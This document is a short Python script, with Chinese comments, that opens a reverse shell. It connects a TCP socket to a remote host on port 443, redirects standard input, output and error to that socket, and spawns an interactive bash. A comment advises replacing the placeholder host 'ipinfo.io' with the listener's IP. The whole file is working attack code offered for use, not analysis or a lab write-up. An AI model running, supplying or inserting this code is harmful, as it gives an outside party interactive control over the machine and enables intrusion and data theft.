#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import os
import pty

def connect_reverse_shell(ip, port):
    try:
        # 1. 创建 TCP 套接字
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # 2. 连接到远程监听端
        s.connect((ip, port))
        
        # 3. 将标准输入(0)、标准输出(1)、标准错误(2)重定向到 socket 描述符
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # 4. 启动一个交互式的 bash 终端
        pty.spawn("/bin/bash")
        
    except Exception as e:
        print(f"[-] 连接失败: {e}")

if __name__ == "__main__":
    # 配置你的监听端 IP 和端口
    # 注意：你原本命令中填写的 "ipinfo.io" 通常只用于查询 IP，实际测试中请替换为你的监听机 IP
    LHOST = "ipinfo.io" 
    LPORT = 443
    
    connect_reverse_shell(LHOST, LPORT)
